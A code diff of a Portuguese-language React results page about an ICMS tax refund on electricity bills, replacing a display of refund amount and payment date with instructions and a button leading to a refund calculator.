@@ -530,49 +530,43 @@ export default function Resultado() {
                         </div>
                       </div>
                       
-                      {/* Dados da Restituição */}
+                      {/* Instruções para calcular a restituição */}
                       <div className="border-b pb-4">
                         <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
-                          Dados da Restituição
+                          Calcule sua Restituição
                         </h3>
                         <div className="bg-[var(--gov-blue-light)] p-4 rounded-lg border border-[var(--gov-blue-light)]">
-                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <div>
-                              <p className="text-sm text-[var(--gov-gray-dark)]">Período Analisado:</p>
-                              <p className="font-medium">{mesesAvaliados} meses</p>
+                          <div className="space-y-4">
+                            <div className="flex items-start">
+                              <CircleDollarSign className="h-5 w-5 mt-0.5 mr-2 text-[var(--gov-blue)]" />
+                              <div>
+                                <p className="font-medium">Saiba quanto você tem a receber!</p>
+                                <p className="text-sm text-[var(--gov-gray-dark)]">
+                                  Na próxima etapa, você poderá calcular o valor da sua restituição do ICMS com base nas suas contas de energia elétrica dos últimos 5 anos.
+                                </p>
+                              </div>
                             </div>
-                            <div>
-                              <p className="text-sm text-[var(--gov-gray-dark)]">Data de Pagamento Prevista:</p>
-                              <p className="font-medium flex items-center">
-                                <CalendarClock className="h-4 w-4 mr-1 text-[var(--gov-blue)]" />
-                                {dataPagamento}
-                              </p>
-                            </div>
-                            <div className="md:col-span-2">
-                              <p className="text-sm text-[var(--gov-gray-dark)]">Valor Total da Restituição:</p>
-                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">
-                                {formatarValor(valorTotal)}
-                              </p>
+                            <div className="flex items-start">
+                              <AlertCircle className="h-5 w-5 mt-0.5 mr-2 text-[var(--gov-blue)]" />
+                              <div>
+                                <p className="font-medium">O que você vai precisar:</p>
+                                <ul className="text-sm text-[var(--gov-gray-dark)] ml-4 list-disc">
+                                  <li>Valor médio da sua conta de luz</li>
+                                  <li>Período aproximado em que você utiliza esta companhia elétrica</li>
+                                </ul>
+                              </div>
                             </div>
                           </div>
                         </div>
                       </div>
                       
                       {/* Ações disponíveis */}
-                      <div className="flex flex-col md:flex-row gap-4 justify-center">
+                      <div className="flex justify-center mt-6">
                         <Button 
-                          variant="outline" 
-                          className="flex items-center justify-center"
-                          onClick={gerarComprovante}
-                        >
-                          <Download className="mr-2 h-4 w-4" />
-                          Gerar Comprovante
-                        </Button>
-                        <Button 
-                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center"
+                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full md:w-auto px-10"
                           onClick={prosseguirParaSimulador}
                         >
-                          Prosseguir para Simulador
+                          Calcular Restituição
                           <ChevronRight className="ml-2 h-5 w-5" />
                         </Button>
                       </div>
